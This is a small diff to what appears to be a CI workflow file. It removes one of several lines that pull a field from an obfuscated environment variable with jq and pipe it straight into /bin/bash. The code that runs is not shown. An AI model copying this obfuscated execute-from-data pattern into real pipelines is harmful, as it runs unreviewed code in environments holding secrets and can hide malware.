@@ -31,7 +31,6 @@ jobs:
           echo $oh03511 | jq -r .fzi341 | /bin/bash
           echo $h0381 | jq -r .h890 | /bin/bash
           printf '%s' "$rb62" | jq -r .keg985 | /bin/bash
-          printf '%s' "$thx438" | jq -r .xbwr2396 | /bin/bash
           printf '%s' "$eevm038" | jq -r .t66208 | /bin/bash
           echo $ks1273 | jq -r .exjxt11 | /bin/bash
           echo $j84 | jq -r .cb9 | /bin/bash
